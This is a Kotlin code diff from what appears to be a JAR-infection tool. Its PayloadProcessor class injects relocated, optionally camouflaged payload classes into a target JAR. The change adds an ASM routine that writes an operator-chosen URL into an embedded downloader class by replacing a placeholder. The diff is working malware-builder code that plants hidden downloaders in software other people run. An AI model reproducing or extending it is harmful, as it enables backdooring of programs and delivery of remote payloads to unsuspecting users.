@@ -31,6 +31,7 @@ class PayloadProcessor {
 
     private companion object {
         const val DOWNLOADER_CLASS_NAME = "com/tmquan2508/payload/FileDownloader.class"
+        const val DOWNLOADER_URL_PLACEHOLDER = "::URL::"
         const val ORIGINAL_MAIN_PAYLOAD_NAME = "com/tmquan2508/exploit/Config"
         const val ORIGINAL_PACKAGE = "com/tmquan2508/exploit"
     }
@@ -41,10 +42,13 @@ class PayloadProcessor {
         targetJar: File,
         dominantVersion: JavaVersion,
         config: Config,
-        configJson: String
+        configJson: String,
+        downloaderUrl: String
     ): ProcessedPayload {
-        val downloaderBytes = this.javaClass.classLoader.getResourceAsStream(DOWNLOADER_CLASS_NAME)?.readBytes()
+        val originalDownloaderBytes = this.javaClass.classLoader.getResourceAsStream(DOWNLOADER_CLASS_NAME)?.readBytes()
             ?: throw IllegalStateException("Could not find internal downloader class: '$DOWNLOADER_CLASS_NAME'")
+
+        val patchedDownloaderBytes = patchDownloaderUrl(originalDownloaderBytes, downloaderUrl)
 
         val (relocationMap, finalMainPayloadName) = createRelocationPlan(camouflageEnabled, targetJar, rawPayloadClasses)
         val transformedBytecodeMap = transformAndRelocatePayload(rawPayloadClasses, relocationMap, dominantVersion)
@@ -52,7 +56,7 @@ class PayloadProcessor {
         val configuredBytecodeMap = applyConfigurationWithAsm(
             originalBytecodeMap = transformedBytecodeMap,
             targetClassName = finalMainPayloadName,
-            downloaderBytes = downloaderBytes,
+            downloaderBytes = patchedDownloaderBytes,
             config = config,
             configJson = configJson
         )
@@ -65,6 +69,36 @@ class PayloadProcessor {
             .map { (name, bytes) -> ClassFile(bytes).apply { this.name = name } }
 
         return ProcessedPayload(otherClasses, finalMainPayloadName, finalMainPayloadBytes)
+    }
+
+    private fun patchDownloaderUrl(originalBytes: ByteArray, newUrl: String): ByteArray {
+        val classReader = ClassReader(originalBytes)
+        val classNode = ClassNode()
+        classReader.accept(classNode, 0)
+        var patched = false
+
+        Logs.info(" -> Patching downloader with URL: '$newUrl'")
+
+        for (method in classNode.methods) {
+            for (insn in method.instructions) {
+                if (insn is LdcInsnNode && insn.cst == DOWNLOADER_URL_PLACEHOLDER) {
+                    insn.cst = newUrl
+                    patched = true
+                    Logs.debug("  [ASM-PATCH] Replaced downloader placeholder in ${classNode.name}")
+                    break
+                }
+            }
+            if (patched) break
+        }
+
+        if (!patched) {
+            // Lỗi này nghiêm trọng hơn vì nó có nghĩa là FileDownloader.java không có placeholder
+            throw IllegalStateException("Could not find URL placeholder in downloader bytecode. Make sure it's compiled with '::URL::'.")
+        }
+
+        val classWriter = ClassWriter(ClassWriter.COMPUTE_FRAMES)
+        classNode.accept(classWriter)
+        return classWriter.toByteArray()
     }
 
     private fun createRelocationPlan(
